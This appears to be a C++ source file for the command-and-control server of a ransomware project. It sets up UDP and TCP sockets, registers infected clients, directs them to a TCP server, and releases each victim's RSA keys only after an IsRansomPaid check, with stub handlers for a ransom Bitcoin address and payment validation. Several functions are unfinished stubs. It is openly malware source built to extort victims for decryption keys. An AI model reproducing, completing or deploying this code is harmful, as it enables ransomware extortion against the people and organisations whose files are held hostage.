#include "../Headers/server.h"

RSAKeys ServerInterface::GenerateRSAPair() {

	return std::make_pair("empty", "empty");
}

void ServerInterface::ListenForUDPMessages() {

	// UDP requests are not encrypted.
	sockaddr_in recvAddr;
	int addrSize = sizeof(recvAddr);

	// receive while udp server is alive
	while ( this->UDPServerDetails.alive == TRUE ) {
		ClientRequest req;
		sockaddr_in addr = NetCommon::UDPRecvMessage(this->UDPServerDetails.sfd, req );
		
		std::cout << "Received a message on the UDP socket." << std::endl;
		PerformUDPRequest(req, addr);
	}
	std::cout << "Not receiving\n";
}

BOOL ServerInterface::PerformTCPRequest(ClientMessage req, long cuid) {
	BOOL		  success = FALSE;
	Client		  client  = GetClientData(cuid).first; // client who made the request
	ServerCommand responseCommand;

	if ( !ClientIsInClientList(cuid) )
		return success;

	switch ( req.action ) {
	case ClientMessage::REQUEST_PUBLIC_ENCRYPTION_KEY:
		if ( !IsRansomPaid(client) ) {
			success = FALSE;
			break;
		}

		responseCommand.action = RemoteAction::RETURN_PUBLIC_RSA_KEY;
		responseCommand.publicEncryptionKey = client.RSAPublicKey;
		responseCommand.privateEncryptionKey = client.RSAPrivateKey;
		success = TCPSendMessageToClient(cuid, responseCommand);

		break;
	case ClientMessage::REQUEST_RANSOM_BTC_ADDRESS:
		break;
	case ClientMessage::VALIDATE_RANSOM_PAYMENT:
		break;
	}
}

void ServerInterface::TCPReceiveMessagesFromClient(long cuid) {
	std::cout << "New thread created to receive messages from client " << cuid << std::endl;
	Client client = GetClientData(cuid).first;
	BOOL receiving = FALSE;
	
	// tcp receive main loop
	do 
	{
		// receive data from client, decrypt it using their aes key
		ClientMessage receivedData = ReceiveDataFrom<ClientMessage>(this->TCPServerDetails.sfd, cuid);
		if ( !receivedData.valid ) // invalid request
			continue;

		PerformTCPRequest(receivedData, cuid);
	} 
	while ( receiving );
}

void ServerInterface::AcceptTCPConnections() {
	while ( this->ClientList.size() < MAX_CON && this->TCPServerDetails.alive == TRUE )
	{
		// accept
		sockaddr_in addr = {};
		int size = sizeof(sockaddr_in);
		SOCKET clientSocket = AcceptOnSocket(this->TCPServerDetails.sfd, reinterpret_cast<sockaddr*>( &addr ), &size);
		if ( clientSocket == INVALID_SOCKET )
			continue;

		std::cout << "Accepted a client on the tcp server." << std::endl;

		Client newClient(addr); // make a new client and store the addr info in it
		//newClient.SetRSAKeys(this->GenerateRSAPair());
		AddToClientList(newClient); // add them to the client list

		std::cout << "- Added the client to the client list\n";

		//// start receiving tcp data from that client for the lifetime of that client
		std::thread receive(&ServerInterface::TCPReceiveMessagesFromClient, this, newClient.ClientUID);
		receive.detach();

		// make it so we can send information to the client
	}
}

Server ServerInterface::NewServerInstance(SocketTypes serverType, int port) {
	Server server = {};
	
	if ( !NetCommon::WSAInitialized )
		NetCommon::LoadWSAFunctions();

	// create socket for server type
	// update server fields
	if ( serverType == TCP ) {
		server.sfd = CreateSocket(AF_INET, SOCK_STREAM, 0);
		if ( server.sfd == INVALID_SOCKET )
			return server;

		server.type = SOCK_STREAM;
	} else if ( serverType == UDP) {
		server.sfd = CreateSocket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
		if ( server.sfd == INVALID_SOCKET )
			return server;
		server.type = SOCK_DGRAM;
	}

	//hostent* host = GetHostByName(DNS_NAME.c_str());

	// update server fields
	//memcpy(&server.addr.sin_addr, host->h_addr_list[0], host->h_length);
	
	server.addr.sin_addr.s_addr = INADDR_ANY;
	server.addr.sin_family	    = AF_INET;
	server.addr.sin_port        = htons(port);
	server.port                 = port;
	server.alive = TRUE;

	std::cout << "Created server on port: " << port << std::endl;

	return server;
}

BOOL ServerInterface::StartServer(Server& server) {
	if ( server.sfd == INVALID_SOCKET )
		return FALSE;

	// bind
	int status = SOCKET_ERROR;
	status = BindSocket(server.sfd, ( sockaddr* ) &server.addr, sizeof(server.addr));
	if ( status == SOCKET_ERROR )
		return FALSE;

	MarkServerAsAlive(server); // alive once binded

	// listen if TCP server
	if ( server.type == SOCK_STREAM ) {
		status = SocketListen(server.sfd, SOMAXCONN);
		if ( status == SOCKET_ERROR )
			return FALSE;

		this->TCPServerDetails = server;

		// start accepting
		std::thread acceptThread(&ServerInterface::AcceptTCPConnections, this);
		acceptThread.detach(); // run accept thread even after this function returns
	}
	// otherwise if not tcp server then listen for udp messaages
	else if ( server.type == SOCK_DGRAM ) {
		this->UDPServerDetails = server;

		std::thread receiveThread(&ServerInterface::ListenForUDPMessages, this);
		receiveThread.detach();
	}

	return TRUE;
}

BOOL ServerInterface::TCPSendMessageToClient(long cuid, ServerCommand& req) {
	return TRUE;
}

ClientResponse ServerInterface::WaitForClientResponse(long cuid) {
	return {};
}

BOOL ServerInterface::UDPSendMessageToClient(Client clientInfo, UDPMessage& message) {
	message.isValid = TRUE;
	return NetCommon::UDPSendMessage(message, this->UDPServerDetails.sfd, clientInfo.AddressInfo);
}

BOOL ServerInterface::PerformUDPRequest(ClientMessage req, sockaddr_in incomingAddr) {
	BOOL success = FALSE;
	
	// udp isnt encrypted, which is why we want to get out of udp as fast as possible
	// only serialized as a bytestring to send over sockets
	if ( !req.valid )
		return FALSE;

	std::cout << "Performing UDP request. Action: " << req.action << std::endl;

	switch ( req.action ) {
	case ClientMessage::CONNECT_CLIENT:	
		Client client(incomingAddr);
		client.UDPSocket = req.udp;
		
		std::cout << "Client: " << client.UDPSocket  << std::endl;

		// client wants to connect so respond with tcp server details
		hostent* host = GetHostByName(DNS_NAME.c_str());

		Server temp = this->TCPServerDetails;
		memcpy(&temp.addr.sin_addr, host->h_addr_list[0], host->h_length);

		UDPMessage response = {};
		response.TCPServer = temp;

		if ( UDPSendMessageToClient(client, response) )
			success = TRUE;
		break;
	}

	return success;
}

ClientResponse ServerInterface::PingClient(long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return {};

	ClientData clientInfo = GetClientData(cuid);
	Client     client     = clientInfo.first;
	if ( !client.SocketReady(TCP) ) // socket isnt ready so cant ping.
		return {};

	// send the ping to the client over tcp
	ServerCommand pingCommand = { true, {}, "", client.RSAPublicKey, "", PING_CLIENT};
	BOOL sent = TCPSendMessageToClient(cuid, pingCommand);
	if ( !sent )
		return {};

	return WaitForClientResponse(cuid);
}

BOOL ServerInterface::ClientIsInClientList(long cuid) {
	return GetClientList().contains(cuid);
}

BOOL ServerInterface::AddToClientList(Client client) {
	std::cout << "Adding client to list\n";
	long cuid = client.ClientUID;
	
	//// generate a cuid that isnt in use if cuid is already generated
	while ( cuid != -1 && ClientIsInClientList(cuid) ) // keep generating if cuid is in use
		cuid = client.GenerateCUID();
	
	std::cout << "- Locking mutex\n";
	
	ClientListMutex.lock();
	
	RSAKeys    keys = std::make_pair(client.RSAPublicKey, client.RSAPrivateKey);
	ClientData pair = std::make_pair(client, keys);
	std::pair<long, ClientData> clientListValue = std::make_pair(client.ClientUID, pair);
	
	this->ClientList.insert(clientListValue);
	
	ClientListMutex.unlock();

	
	// client has been correctly inserted as a tuple into clientlist
	return this->ClientList.at(client.ClientUID).first.TCPSocket == client.TCPSocket;
}

BOOL ServerInterface::IsClientAlive(long cuid) {
	// Check if client is in ClientList and exists
	if ( !ClientIsInClientList(cuid) )
		return FALSE; // Client doesn't exist. Nothing returned from GetClientData

	ClientData clientInfo = GetClientData(cuid);
	Client client = clientInfo.first;

	if ( client.SocketReady(TCP) == FALSE )
		return FALSE; // socket not setup 

	// Check if client sends and receives ping
	if ( PingClient(cuid).responseCode != C_OK )
		return FALSE; // Client is dead

	return TRUE; // Client is alive
}

template <typename Data>
Data ServerInterface::DecryptClientData(BYTESTRING cipher, long cuid) {
	if ( !ClientIsInClientList(cuid) )
		return {};

	ClientData  clientInfo    = GetClientData(cuid);
	std::string decryptionKey = clientInfo.second.first;
	Data        decrypted     = NetCommon::DecryptInternetData<Data>(cipher, decryptionKey);
	
	return decrypted;
}

ClientRequest ServerInterface::DecryptClientRequest(long cuid, BYTESTRING req) {
	return DecryptClientData<ClientRequest>(req, cuid); // return decrypted clientRequest struct
}

ClientResponse ServerInterface::DecryptClientResponse(long cuid, BYTESTRING resp) {
	return DecryptClientData<ClientResponse>(resp, cuid);
}

BYTESTRING ServerInterface::EncryptServerRequest(ServerRequest& req) {
	BYTESTRING serialized = NetCommon::SerializeStruct(req);
	BYTESTRING cipher = NetCommon::AESEncryptStruct(serialized, req.publicEncryptionKey);

	return cipher;
}